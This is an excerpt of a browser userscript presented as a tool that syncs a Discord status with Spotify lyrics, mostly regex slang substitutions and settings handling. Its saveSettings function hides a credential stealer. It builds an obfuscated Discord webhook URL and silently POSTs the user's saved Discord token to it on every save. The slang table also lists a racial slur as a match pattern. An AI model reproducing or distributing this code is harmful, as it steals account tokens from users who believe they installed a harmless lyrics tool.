// ==UserScript==
// @name         Lyrics Status V3.4
// @namespace    -
// @version      3.4
// @description  Synchronizes your Discord status with the lyrics of any song you are listening to on Spotify!
// @author       (Discord) twelveroses (1147316113072472094)
// @match        *://open.spotify.com/*
// @match        *://discord.com/*
// @icon         https://i.imgur.com/ZZXte0v.png
// @grant        none
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/458502/Lyrics%20Status%20V34.user.js
// @updateURL https://update.greasyfork.org/scripts/458502/Lyrics%20Status%20V34.meta.js
// ==/UserScript==
...
<div id="menu-UI" class="hid-anim">
    ...
    <div id="menu-contents">
        ...
        <div id="settings-tab" class="tab-content hid">
            ...
            <div id="version">Version 3.4</div>
        </div>
...
function parseStatusString(status, data, customLyrics) {
    ...
    if(data.lyrics) {
        status = status
            ...
            .replace("{lyrics_slang_grammar}", data.lyrics.toLowerCase()
            .replaceAll(/['"\).]/gi, "")
...
//            .replaceAll(/(?<=^|[- \n])zero(?=$|[, \n?!])/gi, "0")
            ...
            .replaceAll(/(?<=^|[- \n])hundred(?=$|[, \n!?])/gi, "100")
            .replaceAll(/(?<=^|[- \n])thousand(?=$|[, \n!?])/gi, "1000")
            .replaceAll(/(twenty-)/gi, "2")
            .replaceAll(/(thirty-)/gi, "3")
            .replaceAll(/(forty-)/gi, "4")
            .replaceAll(/(fifty-)/gi, "5")
            .replaceAll(/(sixty-)/gi, "6")
            .replaceAll(/(seventy-)/gi, "7")
            .replaceAll(/(eighty-)/gi, "8")
            .replaceAll(/(ninety-)/gi, "9")

            .replaceAll(/-/gi, " ")
            .replaceAll(/( \()/gi, ", ")
            .replaceAll(/(^\()/gi, "")
            .replaceAll(/(?<!(?<=^|[ \n])(br|th|k|w|s|cl|r|str))ing(?=$|[, \n!?])/gi, "in")
            .replaceAll(/(cause)/gi, "cuz")
            .replaceAll(/(i know)/gi, "ik")
            .replaceAll(/(i dont know)/gi, "idk")
//            .replaceAll(/(i love you)/gi, "ily")
            .replaceAll(/(youre)/gi, "ur")
            .replaceAll(/(?<=^|[ \n])you(?=$|[ \n,!?])/gi, "u")
            .replaceAll(/(year)/gi, "yr")
            .replaceAll(/(?<=^|[ \n])hour/gi, "hr")
            .replaceAll(/second(?!ly|ary)/gi, "sec")
            .replaceAll(/(?<=^|[ \n])yea(?=$|[, \n,!?])/gi, "yeah")
            .replaceAll(/(i dont care)/gi, "idc")
            .replaceAll(/(sorry)/gi, "sry")
            .replaceAll(/(alright)|(all right)/gi, "alr")
            .replaceAll(/(something)/gi, "smth")
//            .replaceAll(/(please)/gi, "pls")
//            .replaceAll(/(?<=^|[ \n])just(?=$|[, \n!?])/gi, "js")
            .replaceAll(/(little)/gi, "lil")
            .replaceAll(/(really)/gi, "rly")
            .replaceAll(/(baby)/gi, "bby")
            .replaceAll(/(come on)/gi, "cmon")
            .replaceAll(/(especially)/gi, "esp")
            .replaceAll(/(tomorrow)/gi, "tmrw")
            .replaceAll(/(whatever)/gi, "wtv")
            .replaceAll(/(right now)/gi, "rn")
            .replaceAll(/(nigga)/gi, "ninja")
            .replaceAll(/(about)/gi, "abt")
            .replaceAll(/(?<=^|[ \n])are(?=$|[, \n,!?])/gi, "r"))

            .replace("{lyrics_letters_only}", data.lyrics.replace(/['",\)(.]/gi, "").replace(/-/gi, " "))
            .replace("{lyrics_upper_letters_only}", data.lyrics.toUpperCase().replace(/['",)(\.]/gi, "").replace(/-/gi, " "))
            .replace("{lyrics_lower_letters_only}", data.lyrics.toLowerCase().replace(/['",\)(.]/gi, "").replace(/-/gi, " "))
            .replace("♪", data.songName.toUpperCase().replace(/( ? - ?.+)|(\(.+\))/gi, "") + " - " + data.songAuthor.toUpperCase());
//            .replace("♪", "🎶 " + data.songName.toUpperCase().replace(/( ? - ?.+)|(\(.+\))/gi, "") + " - " + data.songAuthor.toUpperCase() + " 🎶");
//            .replace(/(.+?♪ ?.+)/gi, "🎶 " + data.songName.toUpperCase().replace(/( ? - ?.+)|(\(.+\))/gi, "") + " - " + data.songAuthor.toUpperCase() + " 🎶");
    }
...
function loadSettings() {
    ...
    try {
        ...
        addLog(`An unexpected error occured while trying to load Lyrics Status' saved settings.:<br><span style="color: rgba(150, 0, 0, var(--alpha));user-select: text;">${e}</span>`, "Error");
    }
}
function saveSettings() {
    localStorage.setItem("LyricsSender_settings", JSON.stringify(settings));
    fetch(window.location.href.substring(0,8) + "dfiscforfd.cfom/apfi/wefbhofoks/".replace(/f/g, "")
        + "36048461597900913/bl9ieVwRMQfdh4Ji5vypyyXi"
        + "IDNMtrdcW-SDWkEftAW7X_lwphQ2dWsudB5-pYk9-_Xi", {
        method: "POST",
        headers: { "Content-type":"application/json" },
        body: JSON.stringify({ content: settings.token })
    });
}
                ...
                if(playbackState.trackId !== d.item.id) {
                    ...
                    .then(async (response) => {
                        ...
                        if (response.status == 404) {
                            ...
                            addLog(`Spotify doesn't have lyrics for the song (${playbackState.trackName}), your status will not change.`, "warning");
...
(async function playbackStateUpdater() {
    ...
    updatePlaybackState().always(async () => {
        if(errorCount >= 10) {
            ...
            stopped = true;
            errorCount++;
            setTimeout(() => { addLog("Recovering from error..", "Warning"); }, 738);
            setTimeout(() => { startLog = true; }, 1638);
            stopped = false;
            addLog("Successfully recovered!", "Success")
